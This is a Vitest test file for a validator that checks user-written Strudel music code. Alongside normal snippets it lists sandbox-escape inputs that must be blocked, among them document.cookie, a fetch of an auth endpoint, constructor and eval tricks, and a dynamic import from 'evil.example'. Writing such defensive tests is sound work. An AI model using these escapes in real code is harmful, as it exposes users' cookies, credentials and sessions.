import { describe, expect, it } from 'vitest';
import { validateStrudelCode } from '../src/strudel/validate';

const ok = (code: string) => validateStrudelCode(code, 'strict');

describe('validateStrudelCode: normal Strudel code passes', () => {
  it.each([
    ['simple', `s("bd sd [~ bd] sd").bank("RolandTR909")`],
    ['labels and setcpm', `setcpm(90/4)\n$: note("c3 e3 g3").s("gm_acoustic_grand_piano")\n_$: s("hh*8")`],
    [
      'stack and functions',
      `stack(\n  n("0 2 4 <5 7>").scale("C:minor").s("sawtooth").lpf(sine.range(400, 2000).slow(8)),\n  s("bd*4").gain(.9)\n).room(.3)`,
    ],
    [
      'variables and arrows',
      `const chords = "<Am C F G>"\nlet bass = note(chords.split(" ").map(c => c)).s("gm_electric_bass_finger")\nbass`,
    ],
    [
      'samples() and arrange',
      `samples('github:tidalcycles/dirt-samples')\narrange([4, s("bd*2")], [2, s("hh*4")])`,
    ],
    ['template mini notation', 'note(`<c e g>`).legato(.5)'],
    ['numeric index', 'const xs = [1, 2, 3]; xs[0]'],
    ['comments', '// just a comment\n/* block */ s("bd")'],
  ])('%s', (_name, code) => {
    const r = ok(code);
    expect(r.issues).toEqual([]);
    expect(r.ok).toBe(true);
  });
});

describe('validateStrudelCode: escapes are blocked', () => {
  it.each([
    ['fetch', `fetch('/api/auth/me')`],
    ['window', `window.parent.postMessage('x', '*')`],
    ['globalThis', `globalThis.fetch('x')`],
    ['document', `document.cookie`],
    ['this', `this.fetch('x')`],
    ['constructor', `(() => {}).constructor('return fetch')()`],
    ['constructor via string', `s("bd")["constructor"]`],
    ['computed key', `const k = "con" + "structor"; ({})[k]`],
    ['__proto__', `({}).__proto__`],
    ['eval', `eval("1")`],
    ['Function', `Function("return this")()`],
    ['dynamic import', `import('https://evil.example/x.js')`],
    ['import.meta', `import.meta.url`],
    ['shorthand reference', `const o = { fetch }`],
    ['shadowing trick', `function f(window) {} window.location`],
    ['setTimeout', `setTimeout("alert(1)")`],
    ['localStorage', `localStorage.getItem('x')`],
    ['Reflect', `Reflect.apply(f, null, [])`],
    ['getPrototypeOf', `Object.getPrototypeOf(s)`],
    ['template expression', 'note(`${fetch("x")}`)'],
  ])('%s', (_name, code) => {
    const r = ok(code);
    expect(r.ok).toBe(false);
    expect(r.issues.length).toBeGreaterThan(0);
  });
});

describe('validateStrudelCode: modes and errors', () => {
  it('lenient mode only warns about security findings', () => {
    const r = validateStrudelCode(`fetch('x')`, 'lenient');
    expect(r.ok).toBe(true);
    expect(r.issues[0]).toMatchObject({ severity: 'warning', line: 1, column: 1 });
  });

  it('reports syntax errors with a position in both modes', () => {
    const r = validateStrudelCode('s("bd"\nnote(', 'lenient');
    expect(r.ok).toBe(false);
    expect(r.issues[0]!.severity).toBe('error');
    expect(r.issues[0]!.message).toMatch(/^Syntax error/);
    expect(r.issues[0]!.line).toBeGreaterThanOrEqual(2);
  });

  it('property names that look like globals are fine', () => {
    expect(ok(`s("bd").open`).ok).toBe(true);
    expect(ok(`({ fetch: 1 })`).ok).toBe(true);
  });

  it('rejects huge input', () => {
    expect(ok('x'.repeat(200_001)).ok).toBe(false);
  });
});
